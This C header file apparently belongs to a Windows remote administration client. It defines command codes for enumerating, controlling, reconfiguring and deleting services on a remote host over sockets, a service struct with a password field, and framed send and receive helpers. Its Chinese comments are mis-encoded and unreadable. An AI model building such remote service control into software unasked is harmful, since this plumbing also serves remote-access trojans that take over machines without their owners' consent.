/*
*	��������,��������
*/

#include "resource.h"

//˽�ж���
#define WM_USERRCLICKSERVICES	WM_USER + 914		//�����б��һ�
#define WM_SETMYCURSOR			WM_USER + 902		//������

//��������

#define TRAN_DATA_LEN			2048 * 1024			//���ݽ�������

#define CLIENT_ENUM_SERVICES	5019				//�оٷ���
#define CLIENT_CONTROL_SERVICES	5020				//���Ʒ���
#define CLIENT_CONFIG_SERVICES	5021				//���·�������
#define CLIENT_DELETE_SERVICE	5023				//ɾ������

#define NOT_FIND_ANY_FILE		7000				//�Ҳ����κ��ļ�
#define GET_PROCESS_LIST_ERR	7006				//ȡ�����б�ʧ��
#define ENUM_SERVICES_FAIL		7012				//ȡ�����б�ʧ��
#define CONTROL_SERVICES_FAIL	7013				//���Ʒ���ʧ��
#define CONFIG_SERVICES_FAIL	7014				//���·���״̬ʧ��
#define SERVICE_DELETE_ERR		7020				//ɾ������ʧ��

#define TRANS_DATA_ERR			8000				//ͨ�Ŵ���

#define CONN_FILE_SERV_SEND		4011				//��������͹ܵ�
#define CONN_FILE_SERV_RECV		4012				//���������չܵ�

typedef struct _MYSERVICES_
{
	char m_Name[260];
	char m_Disp[260];
	char m_Status[20];
	DWORD dwServiceType; 
	DWORD dwStartType; 
	DWORD dwErrorControl; 
	char lpBinaryPathName[256]; 
	char lpLoadOrderGroup[256]; 
	DWORD dwTagId; 
	char lpDependencies[512]; 
	char lpServiceStartName[256]; 
	char lpDisplayName[256]; 
	char lpDescribe[256];
	char lpPassword [256];
}MYSERVICES,*LPMYSERVICES;


typedef struct _CLIENTDATA_
{
	char*	m_TransData;
	DWORD	m_TransLen;
	HANDLE  m_WorkEvent;
	UINT	m_Command;
	HANDLE	m_ThreadHandle;
	SOCKET	m_SendSocket;
	SOCKET	m_RecvSocket;
	HWND	hParent;
	BOOL	m_IsWork;
}CLIENTDATA,*LPCLIENTDATA;

void TransBagThread(LPVOID lPvoid);
BOOL SendData(SOCKET s, char *data, int len);
BOOL RecvData(SOCKET s, char *data, int len);
BOOL ProcessOneTrans(LPCLIENTDATA pData);
BOOL SendBag(SOCKET s,char *Data,DWORD &len,UINT &command);
BOOL ReadBag(SOCKET s,char *Data,DWORD &len,UINT &command);
void BcdToAsc(unsigned char *BcdStr,unsigned char *AscStr,int BcdStrLen);
void AscToBcd(unsigned char *AscStr,unsigned char *BcdStr,int AscStrLen);
